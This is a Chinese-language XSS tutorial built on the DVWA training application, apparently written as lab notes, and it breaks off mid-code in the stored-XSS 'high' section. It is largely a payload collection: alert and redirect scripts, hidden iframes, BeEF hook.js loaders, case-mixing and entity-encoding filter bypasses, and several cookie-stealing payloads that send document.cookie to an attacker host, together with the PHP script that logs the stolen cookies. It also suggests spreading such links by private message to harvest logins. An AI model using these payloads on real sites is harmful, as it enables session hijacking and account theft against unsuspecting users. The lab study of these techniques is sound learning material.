<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>	iframe元素会创建包含另外一个文档的内联框架</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>	<span class="tag">&lt;<span class="name">textarea</span>&gt;</span>标签定义多行的文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span>		img元素向网页中嵌入一张图片</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">	<span class="tag">&lt;<span class="name">script</span>&gt;</span>标签用于定义客户端脚本，如JavaScript</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    		script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            必需的type属性规定脚本的MIME类型</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            JavaScript的常见应用是图像操作，表单验证以及动态内容更新</span></span></span><br></pre></td></tr></table></figure>
<p><strong>常用JavaScript方法</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert			alert()方法用于显示带有一条指定信息和一个确认按钮的警告框</span><br><span class="line">window.location	window.location对象用于获得当前页面的地址，并把浏览器重定向到新的页面</span><br><span class="line">location.href	返回当前显示的文档的完整URL</span><br><span class="line">onload 			一张页面或一张图片完成加载</span><br><span class="line">onsubmit		确认按钮被点击</span><br><span class="line">onerror			在加载文档或图片时发生错误</span><br></pre></td></tr></table></figure>
<p><strong>构造XSS脚本</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号&#x27;，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符(<span class="tag">&lt;&gt;</span>/&#x27;)做过滤，这样就可以证明这个页面位置存在XSS漏洞。</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>		&lt;!-弹出cookie-&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">300</span> <span class="attr">height</span>=<span class="string">300</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> &lt;!-看不见的页面嵌套-&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;请移步到我们的新站&quot;</span>);location.<span class="property">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);location.<span class="property">href</span>=<span class="string">&quot;http://192.168.137.146/dvwa/robots.txt&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">这里结合了一些社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line">恶意访问代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>	&lt;!-结合BeEF收集用户的cookie-&gt;</span><br><span class="line"></span><br><span class="line">巧用图片标签</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">绕开过滤脚本</span><br><span class="line">大小写<span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span><br><span class="line">字符编码 采用URL，Base64等编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#74;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>hacker<span class="tag">&lt;/<span class="name">a</span>&gt;</span>	&lt;!-unicode编码-&gt;</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并且采用本地cookie访问目标网页</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>	//弹窗</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>	//跳转空白页面不弹窗</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>	//不会发觉</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span>	//不能用</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;&#x27;http://192.168.137.144/cookie_rec.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>	//不能用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;img.<span class="property">width</span>=<span class="number">0</span>;img.<span class="property">height</span>=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>	//不会发觉</span><br></pre></td></tr></table></figure>
<p><strong>输出在HTML属性中</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原型:</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">构造payload:</span><br><span class="line">&quot; onlick=alert(/xss/)</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>输出在CSS代码中</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原型:</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">body</span>&#123;<span class="attribute">color</span>:&#123;&quot;&quot;&#125;;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">构造payload:</span><br><span class="line">black; background-image:url(&#x27;javascript:alert(/xss/)&#x27;)</span><br></pre></td></tr></table></figure>
<p><strong>输出在JavaScript代码中</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原型:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="keyword">var</span> name = <span class="string">&#x27;&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">构造payload:</span><br><span class="line">&#x27;+alert(/xss/)+&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>XSS反射型</strong></p>
<p>执行弹框：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//原链接</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_r/</span><br><span class="line">//新链接</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E#</span><br></pre></td></tr></table></figure>
<p>如果别人登进dvwa后，点进新链接，也会执行弹框。可以执行弹框，那也可以让别人点进链接后将他的cookie发到另一台服务器上。</p>
<p><strong>XSS存储型(危害较大)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali-BeEF</span><br></pre></td></tr></table></figure>
<p>这是一个留言板，留言板的内容会停留在网页上，如果将恶意代码放在网页上，每个人一访问这个留言板就会中招。</p>
<p>执行弹框：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name:hello</span><br><span class="line">message:<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//原链接：</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_s/</span><br><span class="line">//新链接</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_s/</span><br></pre></td></tr></table></figure>
<p>在链接上不会显示什么，但只要一点XSS stored，就会执行弹框。这样称为挂马，把木马挂在了网页上。</p>
<p>访问另一台机器的文件：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;192.168.137.144:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-2-XSS反射型-低"><a href="#4-2-XSS反射型-低" class="headerlink" title="4.2 XSS反射型[低]"></a>4.2 XSS反射型[低]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有做任何过滤。可以利用以上的xss脚本进行操作。</p>
<h2 id="4-3-XSS反射型-中"><a href="#4-3-XSS反射型-中" class="headerlink" title="4.3 XSS反射型[中]"></a>4.3 XSS反射型[中]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>str.replace()会做一个字符串替换，将\<script\>替换成空。所以可以对\<script\>进行重写，或者大小写混合。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-4-XSS反射型-高"><a href="#4-4-XSS反射型-高" class="headerlink" title="4.4 XSS反射型[高]"></a>4.4 XSS反射型[高]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p> htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 </p>
<h2 id="4-5-XSS存储型-低"><a href="#4-5-XSS存储型-低" class="headerlink" title="4.5 XSS存储型[低]"></a>4.5 XSS存储型[低]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取cookie，kali作为服务器与攻击机:</span><br><span class="line">构建收集cookie服务器</span><br><span class="line">构造XSS代码植入到web服务器</span><br><span class="line">等待肉鸡触发XSS代码并将cookie发送到服务器</span><br><span class="line">cookie的利用</span><br></pre></td></tr></table></figure>
<p>构建收集cookie服务器：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /<span class="keyword">var</span>/www/html/cookie_rec.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span>.<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>给以下目录权限，等下生成的文本文件存进去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data.www-data /var/www/</span><br></pre></td></tr></table></figure>
<p>通过渗透机植入XSS代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://192.168.137.144/cookie_rec.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">注：要先清除之前植入的XSS代码</span><br></pre></td></tr></table></figure>
<p>在XSS存储型网页中，发现前端限制留言长度，直接在前端修改最大长度即可。当用户点进XSS存储型时，会显示弹窗，用户的cookie信息就会收集在服务器上。但现在很多浏览器都会拦截弹窗，所以弄一个不会弹窗的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">用户几乎不会发觉cookie被盗</span><br></pre></td></tr></table></figure>
<h2 id="4-6-XSS存储型-中"><a href="#4-6-XSS存储型-中" class="headerlink" title="4.6 XSS存储型[中]"></a>4.6 XSS存储型[中]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$message</span>)));</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$message</span>);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>可知message用了 htmlspecialchars() 函数，暂时不知道怎么利用，但name没有用，所以可以将恶意代码写进name里面。</p>
<h2 id="4-7-XSS存储型-高"><a href="#4-7-XSS存储型-高" class="headerlink" title="4.7 XSS存储型[高]"></a>4.7 XSS存储型[高]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span 